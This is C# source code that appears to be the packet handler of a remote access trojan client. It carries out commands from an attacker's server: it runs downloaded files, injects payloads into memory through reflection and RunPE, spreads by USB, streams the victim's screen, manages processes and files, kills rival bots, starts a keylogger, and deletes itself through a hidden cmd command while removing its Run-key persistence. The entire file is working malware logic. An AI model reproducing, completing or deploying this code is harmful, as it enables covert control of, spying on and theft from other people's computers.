using Client.Helper;
using Client.MessagePack;
using Client.Sockets;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    class HandlePacket
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "sendMessage":
                        {
                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "Ping":
                        {
                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "sendFile":
                        {
                            Received();
                            string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                            Process.Start(fullPath);
                            if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                            {
                                Uninstall();
                            }
                        }
                        break;

                    case "sendMemory":
                        {
                            Received();
                            byte[] buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
                            string injection = unpack_msgpack.ForcePathObject("Inject").AsString;
                            byte[] plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
                            object[] parameters = new object[] { buffer, injection, plugin };
                            Thread thread = null;
                            if (injection.Length == 0)
                            {
                                thread = new Thread(new ParameterizedThreadStart(SendToMemory.Reflection));
                            }
                            else
                            {
                                thread = new Thread(new ParameterizedThreadStart(SendToMemory.RunPE));
                            }
                            thread.Start(parameters);
                        }
                        break;

                    case "close":
                        {
                            try
                            {
                                ClientSocket.Client.Shutdown(SocketShutdown.Both);
                            }
                            catch { }
                            Environment.Exit(0);
                        }
                        break;

                    case "uninstall":
                        {
                            Uninstall();
                        }
                        break;

                    case "usbSpread":
                        {
                            LimeUSB limeUSB = new LimeUSB();
                            limeUSB.Run();
                        }
                        break;

                    case "remoteDesktop":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "false":
                                    {
                                        if (RemoteDesktop.RemoteDesktopStatus == false) return;
                                        RemoteDesktop.RemoteDesktopStatus = false;
                                    }
                                    break;

                                case "true":
                                    {
                                        if (RemoteDesktop.RemoteDesktopStatus == true) return;
                                        RemoteDesktop.RemoteDesktopStatus = true;
                                        RemoteDesktop.CaptureAndSend();
                                    }
                                    break;
                            }
                        }
                        break;

                    case "processManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "List":
                                    {
                                        ProcessManager.ProcessList();
                                    }
                                    break;

                                case "Kill":
                                    {
                                        ProcessManager.ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                    }
                                    break;
                            }
                        }
                        break;

                    case "fileManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "getDrivers":
                                    {
                                        FileManager fileManager = new FileManager();
                                        fileManager.GetDrivers();
                                    }
                                    break;

                                case "getPath":
                                    {
                                        FileManager fileManager = new FileManager();
                                        fileManager.GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
                                    }
                                    break;

                                case "uploadFile":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
                                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                                    }
                                    break;

                                case "deleteFile":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                        File.Delete(fullPath);
                                    }
                                    break;

                                case "execute":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                        Process.Start(fullPath);
                                    }
                                    break;
                            }


                        }
                        break;

                    case "socketDownload":
                        {
                            FileManager fileManager = new FileManager();
                            string file = unpack_msgpack.ForcePathObject("File").AsString;
                            string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                            fileManager.DownnloadFile(file, dwid);

                        }
                        break;

                    case "botKiller":
                        {
                            BotKiller botKiller = new BotKiller();
                            botKiller.RunBotKiller();
                        }
                        break;

                    case "keyLogger":
                        {
                            FileManager fileManager = new FileManager();
                            string isON = unpack_msgpack.ForcePathObject("isON").AsString;
                            if (isON == "true")
                            {
                                new Thread(() =>
                                {
                                    LimeLogger.isON = true;
                                    LimeLogger.Run();
                                }).Start();
                            }
                            else
                            {
                                LimeLogger.isON = false;
                            }
                        }
                        break;
                }
            }
            catch { }
        }

        private static void Received()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            ClientSocket.BeginSend(msgpack.Encode2Bytes());
        }


        private static void Uninstall()
        {
            if (Convert.ToBoolean(Settings.Install))
            {
                try
                {
                    Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").DeleteValue(Path.GetFileName(Settings.ClientFullPath));
                }
                catch { }
            }
            ProcessStartInfo Del = null;
            try
            {
                Del = new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                };
            }
            catch { }
            finally
            {
                Methods.CloseMutex();
                Process.Start(Del);
                Environment.Exit(0);
            }
        }


    }
}
